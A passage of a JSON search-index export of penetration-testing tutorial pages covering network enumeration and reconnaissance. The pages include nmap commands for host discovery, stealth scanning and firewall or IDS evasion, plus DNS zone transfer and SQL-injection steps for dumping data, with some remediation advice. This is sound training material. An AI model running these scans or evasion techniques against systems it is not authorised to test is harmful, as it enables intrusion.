    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "55e2a7ec52f92c0d92359d62332a0fd3",
    "u": "https://enum.tymyrddin.dev/docs/system/cloud",
    "t": "Scanning cloud infrastructure ",
    "c": "Scanning cloud infrastructure  Most internet resources on cloud providers, like load balancers, content distribution networks, S3 buckets, etc., regularly rotate their IP addresses. If the nmap takes too long, the addresses will have been assigned to another customer and the results will no longer be relevant. Scan domain names, not IP addresses. nmap -F -sV -iL domains.txt -oA results Spotting hidden relationships  Consider the core business and what other servers and datastores there are likely to be. Keep an eye open for information that might indicate where to find those.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "54522f627bbdd621763a16e528931aea",
    "u": "https://enum.tymyrddin.dev/docs/system/ntp",
    "t": "NTP enumeration ",
    "c": "NTP enumeration  An attacker can enumerate the following information by querying an NTP server. List of hosts connected to the NTP server Internal client IP addresses, hostnames and operating system used Tools  NTP enumeration tools Remediation  Restrict the usage of NTP and enable the use of NTPSec, where possible. Filter the traffic with IPTables. Enable logging for the messages and events.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "87c7f8b3aca09a9b29a4f4d7273e785b",
    "u": "https://enum.tymyrddin.dev/docs/vulns/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Discover vulnerabilities: Known vulnerabilities are the simplest vulnerabilities which have been discovered and disclosed. These are often found in the libraries and frameworks that are part of an application. These vulnerabilities tend to get hit very quickly (hours) after disclosure by automated attacks from all over the world, so response speed is critical. Latent vulnerabilities are instances of typical vulnerability classes.: buffer overflows, cross-site scripting (XSS) and SQL injection for example.These vulnerabilities are not listed in databases – these are unique to each application. New vulnerabilities represent a new class of vulnerability. These appear at a slow rate, maybe one or two per year. After discovery, research and confirmations, these turn into latent vulnerabilities. There is a learning curve on these new vulnerabilities for attackers and defenders. This type of research is expensive and for most companies unlikely to produce much payoff in terms of overall risk reduction. Why?  To compromise the security of the system and potentially gain full access to the system. How?  Mapping vulnerabilities to exploits Prioritisation of vulnerabilities Discovering more vulnerabilities/exploits",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "36d98026c869ed6b8d5fb4b4f6dc6d45",
    "u": "https://enum.tymyrddin.dev/docs/system/ldap",
    "t": "LDAP enumeration ",
    "c": "LDAP enumeration  LDAP supports anonymous remote queries on the server. The query will disclose sensitive information such as usernames, address, contact details, etc. Tools  LDAP enumeration tools Remediation  Use SSL to encrypt LDAP communication Use Kerberos to restrict the access to known users Enable account lockout to restrict brute-forcing Create a few Active Directory Decoy accounts Enable auditing on those accounts Run Bloodhound’s Sharphound tool Perform LDAP Reconnaissance activities within the active directory environment Detect the activities in Windows event logs.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "107794ffefe7d0da979c234ae03f2a2e",
    "u": "https://enum.tymyrddin.dev/docs/app/binaries",
    "t": "Download or obtain and decompile binaries ",
    "c": "Download or obtain and decompile binaries  Download or obtain binaries and then use a decompiler to analyse the binary . Review the application in a debugger. Look for information such as remote systems the application connects to, database connection strings, or usernames and passwords used by the application (there may be a backdoor).",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "cb6e186f91b8d4679c6f5a5c847724c8",
    "u": "https://enum.tymyrddin.dev/docs/system/linux",
    "t": "Linux enumeration ",
    "c": "Linux enumeration  Get information from: Settings: Users and usernames Applications: some run on defaults, or there may be null or blank passwords Permissions on key directories and files Shares if linux shares resources over the network Samba, the linux equivalent to smb, may give information about the windows network and its shares NFS information can give information on permissions and the network services Network services such as DNS , LDAP , SMTP , etc. Various built-in commands and utilities Tools  Linux enumeration tools Remediation  Minimize the attack surface by removing any unnecessary or unused service. Ensure IPTables is configured to restrict the access.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "90a4cd9ec2bd9e8e4a00397f11ccfa44",
    "u": "https://enum.tymyrddin.dev/docs/system/smtp",
    "t": "SMTP enumeration ",
    "c": "SMTP enumeration  SMTP provides three built-in commands: VRFY: Validate users on the SMTP servers EXPN: Delivery addresses of aliases and mailing lists RCPT TO: Defines the recipients of the message SMTP servers respond differently to the commands mentioned above, and SMTP enumeration is possible due to varied responses. Attackers can determine the valid users on the SMTP servers with the same technique. Tools  SMTP enumeration tools Remediation  Ignore email responses from unknown recipients. Disable open relay functionality. Prune any sensitive information like mail server and localhost in the mail responses.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e51a3a5b7a01adf9feec37ef369c98d7",
    "u": "https://enum.tymyrddin.dev/docs/system/windows",
    "t": "Windows enumeration ",
    "c": "Windows enumeration  Get information: Usernames Default configurations Default passwords Domain names Computer names Shares Windows information Network information like DNS , SMTP , SNMP information Application details Banners Routing tables Tools  Windows enumeration tools Remediation  Minimize the attack surface by removing any unnecessary or unused service. Ensure IPTables is configured to restrict the access.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "517b315e6fd40e47e801db5896d51370",
    "u": "https://enum.tymyrddin.dev/docs/system/macos",
    "t": "macOS enumeration ",
    "c": "macOS enumeration  Get information from: Settings: Users and usernames Applications: some run on defaults, or there may be null or blank passwords Permissions on key directories and files Shares if macOS shares resources over the network Samba, the linux equivalent to smb, may give information about the windows network and its shares NFS information can give information on permissions and the network services Network services such as DNS , LDAP , SMTP , etc Various built-in commands and utilities Tools  macOS enumeration tools Remediation  Minimize the attack surface by removing any unnecessary or unused service. Ensure IPTables is configured to restrict the access.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "7a7948d45c2b893ccde3bfea260a6c84",
    "u": "https://enum.tymyrddin.dev/docs/app/database",
    "t": "Enumerate databases ",
    "c": "Enumerate databases  Gather information using database enumeration tools : Find a page url with a GET request parameter Test different SQL injection methods against the request parameter List information about the existing databases List information about tables present in a particular database List information about the columns of a particular table Dump the data",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "cee55ab4f5890c064bbed72e7189817c",
    "u": "https://enum.tymyrddin.dev/",
    "t": "Lay of the land ",
    "c": "Lay of the land  Move further and deeper into the scanning process to include security scanning. Enumeration is particularly useful in networks that contain unprotected network resources and services. The distinction between reconnaissance and remote enumeration is an arbitrary grey area, and during enumeration new hosts and/or services may show up, so what you can not find here you may find there . Preparation Build a local testlab Enumeration overview Systems Introduction NetBios enumeration SNMP enumeration LDAP enumeration NTP enumeration SMTP enumeration DNS enumeration macOS enumeration Linux enumeration Windows enumeration Scanning virtualised systems Scanning cloud infrastructure Web applications Introduction Dynamic web application scanning Enumerate databases Download or obtain and decompile binaries Automated vulnerability scanning Scanning an API Vulnerability identification Introduction Mapping vulnerabilities to exploits Prioritisation of vulnerabilities Discovering more vulnerabilities/exploits",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "d1fb7158db4895c0da090e1a0a4c25fd",
    "u": "https://recon.tymyrddin.dev/",
    "t": "Falconry ",
    "c": "Falconry  Getting to know the target using methods like researching publicly available information and network scanning. Preparation Build a local testlab Footprinting Introduction Gather network information Gather system information Collect organisation information Initial scanning Introduction War-dialing-driving-flying-shipping Live host discovery Host discovery with ICMP Host discovery with TCP Host discovery with UDP Port scanning Service and OS detection Diving deeper in discovery Defence detection Stealth scans Firewall evasion Canopy of apple-blossom Introduction Manually walk through the target Scope discovery Other sneaky OSINT techniques Tech stack fingerprinting API Mayhem Introduction Collect data Understand application functionality Analyse traffic Document key parameters Check for exposed secrets Head in the clouds Introduction Mapping endpoints Investigating AWS S3 URLs Pocketful of acorns Introduction Passive reconnaissance Recon of facilities",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "54d37ed8ae0101af9f5cf86095e2c0d5",
    "u": "https://recon.tymyrddin.dev/docs/scanning/service-and-os",
    "t": "Service and OS detection ",
    "c": "Service and OS detection  Detect Operating Systems Detect services Service and OS detection use different methods to determine the operating system or service running on a particular port. Detect services: # nmap -sV -T4 -Pn -oG ServiceDetect -iL $TARGETFILE OS detection: # nmap -O -T4 -Pn -oG OSDetect -iL $TARGETFILE",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "516b73f997f19907408cf9a557036fbf",
    "u": "https://recon.tymyrddin.dev/docs/api/parameters",
    "t": "Document key parameters ",
    "c": "Document key parameters  An API’s attack surface includes the inputs and outputs of the API. Using the inputs and outputs, determine the potential vulnerabilities in the API. These inputs and outputs include: API calls URL parameters Headers Cookies Web responses File uploads API keys Identify the inputs and outputs of the API: The inputs and outputs of an API can be identified by the endpoints that the API provides. Make requests to different endpoints, interacting with the resources that the API exposes. The responses that the API sends back will contain the information necessary to understand the structure of the data being returned. Resources  API Security Top 10 2019",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "17825e36126dfc3ace6f87d8ffb5728c",
    "u": "https://recon.tymyrddin.dev/docs/scanning/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Determine what hosts are available on the network, what services (application name and version) those hosts are offering, what operating systems (and OS versions) they are running, what type of packet filters/firewalls are in use … Why?  To find potential initial vulnerable attack vectors. How?  War-dialing-driving-flying-shipping Live host discovery Host discovery with ICMP (ping sweep) Host discovery with TCP Host discovery with UDP Port scanning Service and OS detection Diving deeper in discovery Defence detection Stealth scans Firewall evasion",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "738465a0e68d71e161decdd51698ce1f",
    "u": "https://recon.tymyrddin.dev/docs/footprinting/network",
    "t": "Gather network information ",
    "c": "Gather network information  Domains Subdomains IP addresses Whois and DNS records Whois and IP Geolocation  Whois databases contain domain owners’ personal information and are maintained by the Regional Internet Registries. Thick whois contains all information from all registrars for the specified set of data. Thin whois contains limited information about the specified set of data. Whois query results typically include: Domain details Domain owner details Domain server Net range Domain expiration Creation and last update dates Regional Internet Registries, which maintain the whois databases, include: Reseaux IP Europeens Network Coordination Centre (RIPE) American Registry for Internet Numbers (ARIN) Asia-Pacific Network Information Centre (APNIC) Latin America and Caribbean Network Information Centre (LACNIC) Africa’s NIC (AFRINIC) IP Geolocation  IP geolocation helps find location information about a target such as country, city, postal code, ISP, and so on. This informationis useful for (planning) social engineering attacks on the target. DNS footprinting  DNS footprinting involves collecting information about DNS zone data, which includes information about server types and locations of key hosts in the network. Network Footprinting  Network footprinting refers to the process of collecting information about the target’s network. During this process, attackers collect network range information and use the information to map the target’s network. Network range gives attackers an insight into how the network is structured and which machines belong to the network. Nmap can be used for network discovery. It uses raw IP packets to determine the available hosts on the network, the services offered by those hosts, operating systems they are running, firewall types that are being used, and other important characteristics. Traceroute programs uses the ICMP protocol and the TTL field in the IP header to discover a route to the target host. It records IP addresses and DNS names of discovered routers underway. This information can be used for man-in-the-middle and other related attacks. The results of a traceroute can also be used to collect information about network topology, trusted routers, and firewall locations, useful for creating network diagrams and planning attacks.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "b9473199958a0f7470288675561f1f33",
    "u": "https://recon.tymyrddin.dev/docs/cloud/map",
    "t": "Mapping endpoints ",
    "c": "Mapping endpoints  Collect information to identify assets a target has across all cloud providers. Identify services hosted with third-party companies. Map out all the endpoints: user interface, APIs, subnetworks, etc. for which testing is to be done. Decide which endpoints to exclude based on policy restrictions, user permissions, etc. Decide the route for performing the pentest: from application or database. Figure out how well the application server and VMs can take the load of the tests. Find out the laws that need to be followed while performing tests. Figure out which tools to use and what types of tests to do on which endpoints (Automated or Manual). Get approval for the plan from the client and inform them when you wish to begin.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "1ff9b63c2a2b9b13ace655d24f5a3566",
    "u": "https://recon.tymyrddin.dev/docs/scanning/firewall",
    "t": "Firewall evasion ",
    "c": "Firewall evasion  Fragment packets: # nmap -f <IP> Most firewalls and IDS detect fragmented packets. The nmap --mtu command allows for specifying offset size (has to be a multiple of 8). This is similar to the packet fragmentation technique. During the scan, nmap creates packets of that size, causing confusion to the firewall. # nmap --mtu [MTU] <IP> Decoy: # nmap -D RND:[number] <IP> Idle zombie scan: # nmap -sI [zombie] <IP> Manually specify a source port: # nmap --source-port [port] <IP> Append random data: # nmap --data-length [size] <IP> Randomize target scan order: # nmap --randomize-hosts <IP> Spoof MAC address: # nmap --spoof-mac [MAC|0|vendor] <IP> Send bad checksums: # nmap --badsum <IP> The badsum command deploys an invalid TCP/UDP/SCTP checksum for packets transmitted to the target. Practically every host IP stack will correctly drop the packets, so each response accepted is possibly originating from a firewall or Intrusion Detection System that was not concerned with confirming the checksum.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "60ee3fc55140efa070290625facf78dd",
    "u": "https://recon.tymyrddin.dev/docs/scanning/tcp",
    "t": "Host discovery with TCP ",
    "c": "Host discovery with TCP  Split port scans by port number Low TCP port scans Medium TCP port scans High TCP port scans Split scans  Split the scans to get a set of results back in a shorter period of time. This makes it possible to start testing while the remaining results come back. By the time medium port scans are finished, underlying services of the lower ports have probably been enumerated. Use ports 0-1024 for the low range (System Ports). These scans cover services such as SMTP, Windows File Sharing, HTTP, HTTPS and other commonly found services. For medium port use ports 1025-32767 (the bulk of the User Ports). These cover NFS, Sun RPC Port Mapper, X-Windows, VNC, Microsoft Terminal Services, etc. The high port scans are for ports in the range 32768-65535 (the lesser used User Ports and Dynamic or Ephemeral ports). Hints  Do not ping the target in these scans because there may be filtering in place, which could result in pings failing and nmap accidentally concluding that a host is down. Under the hood  TCP SYN (Stealth) scan ( -sS ) is the default and most popular scan option for good reason. It can be performed quickly, scanning thousands of ports per second on a fast network not hampered by intrusive firewalls. SYN scan is relatively unobtrusive and stealthy, since it never completes TCP connections. It works against any compliant TCP stack, and allows clear, reliable differentiation between open, closed, and filtered states. Nmap starts by sending a TCP packet with the SYN flag set and the target send back a response with the SYN and ACK flags. NMap does not complete the handshake with the expected ACK and the OS suddenly receives a SYN/ACK while it hasn’t requested (NMap did). The OS responds to the unexpected SYN/ACK with an RST packet. All RST packets in such scenarios also have the ACK bit set because they are always sent in response to (and acknowledge) a received packet. Because the three-way handshake is never completed, SYN scan is sometimes called half-open scanning. If a service is listening on a port and someone makes a connection to it (by sending a SYN packet), the service will send a SYN/ACK packet in return. That means that there is a machine at that IP address. Note that some operating systems will respond with a SYN/ACK to SYN s sent to ports used for outbound TCP connections, while others will not. If no service is listening on that port but the machine is up and running and on the network, a reset ( RST ) packet will be sent back. That means there is nothing listening on that port, but having sent something in return means that a machine is at that IP address. If nothing is received after sending a SYN packet, it means there is no host at that IP address OR a firewall is blocking traffic OR the host is down. Port 80 is therefore extremely useful for ping sweeps, because most firewalls and port filters do not block web traffic. Send Receive Send Assumption SYN SYN/ACK ACK followed by RST Port is open, host is up SYN RST - Port is closed, host is up SYN Nothing - Port is blocked by firewall, host is down, or there is no host at that IP address. Interpreting portscan outputs  Some puzzling with indicators will help: Anything from 40000 onwards could be anything and only be temporary NFS can run on any port, but the Linux NFS Kernel server implementation always runs on port 2049 by default. VNC clients typically are on port 5900+ If port 5900 AND 5901 are open, most likely 5901 is a second VNC service. If port 5901 is open and 5900 closed, who knows? TCP port 8080 open can indicate a proxy server, or something like Apache Tomcat, or … A Windows Active Directory controller will have TCP ports 53 (DNS), 88 (Kerberos), 389 (LDAP), 636 (LDAP/S) and the common NetBIOS and Windows File Sharing ports 135 (used for RPC comms for AD replication), 139 (Authentication) and 445 (used for a whole host of services including file sharing and authentication) Windows systems tend to use TCP port 3389 for Microsoft Remote Desktop Protocol access. Unix-like systems often use text-based protocols on TCP ports 22 (SSH), 23 (Telnet) and 514 (RSH), or network-based Windowing protocols on TCP ports such as 590x (VNC) or 600x (X11). Examples  Low TCP port scans: # nmap -sS -PN -p 0-1024 -n -iL $TARGETFILE -oA nmap/tcp-lo The result is an open port list, with port and protocol, the port’s state and the by IANA allocated service for that port. This does not mean that a port actually runs that service. Medium TCP port scans: # nmap -sS -PN -p 1025-32767 -n -iL $TARGETFILE -oA nmap/tcp-med Remaining TCP port scans: # nmap -sS -PN -p 32768-65535 -n -iL $TARGETFILE -oA nmap/tcp-hi Expect to find Sun RPC services or DCE RPC services, 3rd-party backup utilities, and application services with SAP deployments.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "9eeb2329002066a0902a656ee46d6c70",
    "u": "https://recon.tymyrddin.dev/docs/physical/facilities",
    "t": "Recon of facilities ",
    "c": "Recon of facilities  Organisations can use a number of physical security controls to regulate who gains access to the facility or what areas in the facility they gain access to. See if you can bypass the security to gain access to areas of facilities you should not have access to. Resources  Guidelines for Performing Physical Security Tests on Facilities",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "439632600c2c42ec4725efa6ef2a8c2e",
    "u": "https://recon.tymyrddin.dev/docs/cloud/s3-urls",
    "t": "Investigating AWS S3 URLs ",
    "c": "Investigating AWS S3 URLs  Endpoints  S3 endpoint is a region-specific URL that is used in both S3 URL styles. Most of the endpoints follow this pattern (with region names being eu-west-1 , us-west-2 , etc): s3-REGION.amazonaws.com And there are some oddities useful to know. Two endpoints that do not follow the above pattern are those of the us-east-1 region. For that region endpoints are synonyms and both point to the same place: s3.amazonaws.com s3-external-1.amazonaws.com Further, the eu-central-1 (Frankfurt) and ap-northeast-2 (Seoul) regions both have one endpoint that follows the general pattern and one alias endpoint that differs from the general scheme in one symbol (the first dash is replaced by dot): s3-eu-central-1.amazonaws.com s3.eu-central-1.amazonaws.com s3-ap-northeast-2.amazonaws.com s3.ap-northeast-2.amazonaws.com S3 bucket URL schemes  According to the S3 Developer Guide (PDF, p.57), S3 supports both virtual-hosted and path URL styles for bucket access. Path style URL  In path style URL, the bucket name is appended to the domain name and is a part of the URL path: http://s3endpoint/<bucket-name> Virtual-hosted style URL  In virtual-hosted style URL the bucket name becomes a subdomain: http://BUCKET.s3endpoint Static Website Hosting Endpoints  Using S3’s Static Website Hosting feature requires using Website Endpoints. There are two general forms of S3 website endpoint: http://BUCKET.s3-website-region.amazonaws.com http://BUCKET.s3-website.region.amazonaws.com Most of the regions follow the first form, while eu-central-1 and ap-northeast-2 follow the second. Presigned URL  Users can create a presigned URL for an object, for which security credentials, a bucket name, an object key, an HTTP method (GET to download the object), and an expiration date and time are given. The presigned URLs are valid only for the specified duration. If a presigned URL is made using a temporary token, then the URL expires when the token expires, even if the URL was created with a later expiration time. Anyone who receives the presigned URL can then access the object. Because presigned URLs grant access to the Amazon S3 buckets to whoever has the URL, Amazon recommends they be protected appropriately . Something often forgotten, apparently. Getting it, but not quite.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "117bf72c53eedd74731f47621540303a",
    "u": "https://recon.tymyrddin.dev/docs/cloud/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Cloud recon. Focus on S3 first. The growing number of Amazon Web Services S3 “data leaks” are due to human intervention – specifically, users who have not correctly configured S3 bucket policies, and as a result, allow public access to S3. In general, a lack of understanding when implementing S3, or carelessness when evaluating what should or should not be available for public consumption. Why?  To gain information for initial access in the cloud. How?  Mapping endpoints and plan Investigating AWS S3 URLs",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "99f2c2f99f7d5f85c1898215c9e40a69",
    "u": "https://recon.tymyrddin.dev/docs/api/secrets",
    "t": "Check for exposed secrets ",
    "c": "Check for exposed secrets  The authentication mechanism is used to identify the user and ensure that they are authorized to access the API. The authentication mechanism is usually a username and password, but it can also be a token or a certificate. It also gives clues to potential vulnerabilities in the API. If the authentication mechanism is weak, then the API is more vulnerable to attack. Resources  API Security Top 10",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "dd3825e3f3fb61448b666dffc1f7a801",
    "u": "https://recon.tymyrddin.dev/docs/app/techstack",
    "t": "Tech stack fingerprinting ",
    "c": "Tech stack fingerprinting  Fingerprinting techniques can help you understand the target application even better. Fingerprinting is identifying the software brands and versions that a machine or an application uses. This information allows you to perform targeted attacks on the application, because you can search for any known misconfigurations and publicly disclosed vulnerabilities related to a particular version. Run Nmap on a machine with the -sV flag on to enable version detection on the port scan. In Burp, send an HTTP request to the server to check the HTTP headers used to gain insight into the tech stack. Many web frameworks or other technologies will embed a signature in source code. Right-click a page, select View Source Code , and press CTRL-F to search for phrases like powered by , built with , and running . Check technology-specific file extensions, filenames, folders, and directories. Wappalyzer is a browser extension that identifies content management systems, frameworks, and programming languages used on a site. BuiltWith is a website that shows you which web technologies a site is built with. StackShare is an online platform that allows developers to share the tech they use. Maybe the organisation’s developers have posted their tech stack. And Retire.js is a tool that detects outdated JavaScript libraries and Node.js packages.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "8a266ac0d06711e4fbb3260fc2906110",
    "u": "https://recon.tymyrddin.dev/docs/scanning/stealth",
    "t": "Stealth scans ",
    "c": "Stealth scans  Stealth  Never use connect scan ( -sT ), which establishes a full connection to a port, if one wishes to remain stealthy. Excessive port connections can create a DoS condition on older boxes, and will raise the alarms on any IDS. Use a stealthy port-scanning method with nmap, such as a TCP SYN scan (sometimes called a half-open scan). It is not only stealthy, it is also lighter on both systems, source and target. Mask your IP from the target (Don’t expect to find possibilities for either of these two all the time, but do keep looking, especially among older systems not offering useful services.): Use an FTP bounce scan if possible. Some ftp servers allow anonymous users to proxy connections to other systems. If you find an anonymous ftp server during enumeration, or you know of one to which you have login credentials, try using the -b option with user:pass@server:ftpport . If the server does not require authentication, you can skip the user:pass and if it is running on the standard port you can also leave out the ftpport part. This only works on some ftp servers. Many ftp servers today have this option disabled (by default). Idle scan gives a similar result but uses a different type of scanning. If you can identify an intermediate machine (a zombie) with low traffic and predictable fragment identification values (IP ID) you can send spoofed packets to your target, with the source set to the zombie with -sI zombiehost:port . An IDS will see the idle scan target as the system doing the scanning. If the idle target is a by your target trusted machine that can bypass host-based access control lists, jackpot!",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "6342ea6759dd923f27e88734c46e6acf",
    "u": "https://recon.tymyrddin.dev/docs/app/stroll",
    "t": "Manually walk through the target ",
    "c": "Manually walk through the target  Manually walk through the application to learn more about it. Try to uncover every feature in the application that users can access by browsing through every page and clicking every link. Access the functionalities that you don’t usually use. Get a rough idea of what the attack surface (all the different points at which an attacker can attempt to exploit the application) looks like, where the data entry points are, and how different users interact with each other. Then you can start a more in-depth recon process: finding out the technology and structure of an application.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e6271cfa9c8df69dc86ca8854add5e18",
    "u": "https://recon.tymyrddin.dev/docs/scanning/icmp",
    "t": "Host discovery with ICMP ",
    "c": "Host discovery with ICMP  The easiest and fastest way to discover if a host is up or not is by trying to send some ICMP packets. Send an echo request using a simple ping or fping (for ranges). If pinging a single host works, try a ping-sweep: Send out ICMP echo requests to every system on a particular network or subset of a network to determine which hosts are up. ICMP error messages can be used to mask the source of a Distributed Denial of Service attack, and with such attacks being common, ICMP error rate limiting is often applied. To avoid filters to common ICMP echo request-response, use nmap to send other types of ICMP packets. If scans still take incredibly long, try discovering hosts with a SYN scan or UDP scan instead. Examples  Send a single echo request # ping -c 1 192.168.122.10 Send echo requests to ranges: # fping -g 192.168.122.0/24 Using nmap, send echo, timestamp requests and subnet mask requests: # nmap -PEPM -sP -n 192.168.122.0/24",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "669a9cd0954ec976c9347b7e46848a15",
    "u": "https://recon.tymyrddin.dev/docs/scanning/hosts",
    "t": "Live host discovery ",
    "c": "Live host discovery  Types of scans  ARP, ICMP, TCP, and UDP can detect live hosts. Any response from a host is an indication that it is online. Scan Type Example Command ARP Scan sudo nmap -PR -sn /24 ICMP Echo Scan sudo nmap -PE -sn /24 ICMP Timestamp Scan sudo nmap -PP -sn /24 ICMP Address Mask Scan sudo nmap -PM -sn /24 TCP SYN Ping Scan sudo nmap -PS22,80,443 -sn /30 TCP ACK Ping Scan sudo nmap -PA22,80,443 -sn /30 UDP Ping Scan sudo nmap -PU53,161,162 -sn /30 Options  Option Purpose -n no DNS lookup -R reverse-DNS lookup for all hosts -sn host discovery only",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c795c53795ef1db0037e6f7bdcee1f11",
    "u": "https://recon.tymyrddin.dev/docs/api/collect-data",
    "t": "Collect data ",
    "c": "Collect data  Collect data from applications through automated and manual means. Scan for open ports and services using shodan Use an application as intended Inspect web application with DevTools Search for API-related directories Discover API endpoints From here: an entry point (typically using the root URI of “/”) contains links to other REST APIs. Those APIs will contain links to other APIs and so on. Ideally, there is no API that does not have a link to it. Tools  Kiterunner Nikto OWASP ZAP",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "0aa1ce3d047d15d68e4a4414feb546fc",
    "u": "https://recon.tymyrddin.dev/docs/scanning/udp",
    "t": "Host discovery with UDP ",
    "c": "Host discovery with UDP  Split port scans by port number Low UDP port scans Remaining UDP port scans Relationship with ICMP  UDP is a stateless protocol. It was designed for applications that do not care whether a packet is received. This could saturate a link, and ICMP is used in its congestion control. Because UDP is stateless, it is easy to spoof using ICMP error messages to mask the source of a Distributed Denial of Service attack, and with such attacks common, UDP scans are considered bad and ICMP error rate limiting good. With 65,535 ports to scan and error rate limits of 1 ICMP message per second, it can take 9+ hours to scan some hosts. Solutions are scanning multiple hosts in parallel, scanning popular ports first, and ignoring ports that require specific protocols and scanning those separately. Older versions of Windows (and some configurations of current Windows systems) do not implement ICMP error rate limiting. Knowing beforehand which are Windows systems, these can be put on a separate IP list. Not responding  UDP services are highly unlikely to respond to a regular empty UDP probe datagaram because the underlying application does not receive a packet that causes it to respond. The solution is to send a packet related to the most likely service (based on port number) running under it. For example, brute forcing SNMP on port 161 could be worthwhile and sending a correctly formed DNS query datagram to UDP port 53 will likely give a useful response. Interpreting portscan outputs  nmap will report a lot of closed ports, and some as open|filtered . The latter means that nmap did not receive a response. Use a combination of ICMP and IP to whittle things down: An open port will respond to a correctly formed application message if the service is supposed to respond to that message A closed port will lead to an ICMP port unreachable from the device (or a similar destination unreachable message from a nearby device) A filtered port will occasionally result in a message, but more often than not, nothing If a packet’s TTL expires an ICMP TTL Expired In Transit message is sent from the router the datagram is currently passing through to the packet’s source Examples  Low UDP port scans: # nmap -sU -PN -n -iL $TARGETFILE -p 0-1024 -oA nmap/udp-lo -sV Expect to find 53, 111 and 137 open. Remaining UDP port scans: # nmap -sU -PN -n -iL $TARGETFILE -p 1025-65535 -oA nmap/udp-full -sV Expect to find Sun RPC services or DCE RPC services, 3rd-party backup utilities, and application services with SAP deployments.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "5b01e41888e428481743749b796e42f7",
    "u": "https://recon.tymyrddin.dev/docs/scanning/ports",
    "t": "Port scanning ",
    "c": "Port scanning  Types of scans  Port Scan Type Example Command TCP Connect Scan nmap -sT TCP SYN Scan sudo nmap -sS UDP Scan sudo nmap -sU TCP Null Scan sudo nmap -sN TCP FIN Scan sudo nmap -sF TCP Xmas Scan sudo nmap -sX TCP Maimon Scan sudo nmap -sM TCP ACK Scan sudo nmap -sA TCP Window Scan sudo nmap -sW Custom TCP Scan sudo nmap --scanflags URGACKPSHRSTSYNFIN Spoofed Source IP sudo nmap -S SPOOFED_IP Spoofed MAC Address --spoof-mac SPOOFED_MAC Decoy Scan nmap -D DECOY_IP,ME Idle (Zombie) Scan sudo nmap -sI ZOMBIE_IP Fragment IP data into 8 bytes -f Fragment IP data into 16 bytes -ff Options  Option Purpose -p- all ports -p1-1023 scan ports 1 to 1023 -F 100 most common ports -r scan ports in consecutive order -T<0-5> T0 being the slowest and T5 the fastest --max-rate 50 rate <= 50 packets/sec --min-rate 15 rate >= 15 packets/sec --min-parallelism 100 at least 100 probes in parallel --source-port PORT_NUM specify source port number --data-length NUM append random data to reach given length Null, FIN, and Xmas scan provoke a response from closed ports, while Maimon, ACK, and Window scans provoke a response from open and closed ports. Option Purpose --reason explains how Nmap made its conclusion -v verbose -vv very verbose -d debugging -dd more details for debugging",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "682e6c01de9ffba0dd3f030fb4db3374",
    "u": "https://recon.tymyrddin.dev/docs/app/dns",
    "t": "Scope discovery ",
    "c": "Scope discovery  Gather deeper and wider Discover websites on the same server Discover subdomains Discover email addresses Discover sensitive files WHOIS and Reverse WHOIS  Use whois to gather Domain name, IP address, Administrative Details, autonomous system number, DNS Go to www.arin.net/whois and search for target name in the ARIN Whois/RDAP Search bar. Find a handle which displays more information about this registration including the range of IP addresses. Find an entry with a net range (public IPs). Determine all the public IP blocks the target may have. If you cannot find any results try some other Whois database search sites. IP addresses  nslookup www.target.com Setting the type of query to MX (mail exchange) records: nslookup set type=MX target.com Then use nslookup again to resolve the FQDNs of the mail servers to IP adressess. Try a DNS zone transfer: nslookup server <ip_or_fqdn_of_target_DNS_server> set type=all ls -d <target_domainname> If successful, make a note of it and add it to the remediation list in the pentest report. Researching certificates  Another way of finding hosts is to take advantage of the Secure Sockets Layer(SSL) certificates used to encrypt web traffic. An SSL certificate’s Subject Alternative Name field lets certificate owners specify additional hostnames that use the same certificate, so you can find those hostnames by parsing this field. Use online databases like crt.sh , Censys , and Cert Spotter to find certificates for a domain. 👉 Wildcard certificates are a single point of failure. If we stumble upon the private key while roaming the network, we could intercept the communication flow of all applications using that same parent domain. When a certificate authority issues a certificate, these are entered into a central repository called a certificate log. This repository keeps a binary tree of all certificates, where each node is the hash of its child nodes, thereby guaranteeing the integrity of the entire chain. All issued TLS certificates should be publicly published to detect domain spoofing, typo-squatting, homograph attacks, and other mischievous ways to deceive and redirect users. These logs can be searched. Secret applications with little security hiding behind proxies can be exposed, and minimally subdomain enumeration is way faster. Subdomain enumeration  After finding as many domains on the target as possible, locate as many subdomains on those domains as you can. Each subdomain represents a new angle for attacking the network. The best way to enumerate subdomains is to use automation. Tools like Sublist3r , SubBrute , Amass , and Gobuster can enumerate subdomains automatically with a variety of wordlists and strategies. For example, Sublist3r works by querying search engines and online subdomain databases, while 